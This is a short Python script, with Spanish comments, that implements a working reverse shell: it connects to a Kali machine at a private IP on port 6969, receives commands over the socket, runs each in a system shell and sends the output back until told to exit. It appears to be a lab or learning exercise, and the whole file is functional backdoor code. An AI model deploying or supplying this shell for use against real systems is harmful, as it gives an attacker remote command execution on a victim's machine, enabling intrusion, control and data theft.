import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Objeto de tipo socket.

s.connect(('192.168.71.128', 6969)) # A donde se va a conectar el socket (a kali).

while True:  
    command = s.recv(4096).decode('UTF-8') # Decirle al programa que va a recibir datos, max 4096 chars. Lo que reciba lo traduce de binario a UTF-8.

    if command == "exit":
        s.close()
        break

    CMD = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT) # Ejecuta la variable command, en una shell, el output lo manda por una pipe y si tienes un std error sácalo también.
    s.send(CMD.stdout) # Manda el output 

    # print("Command Recieved: " + str(command)) 


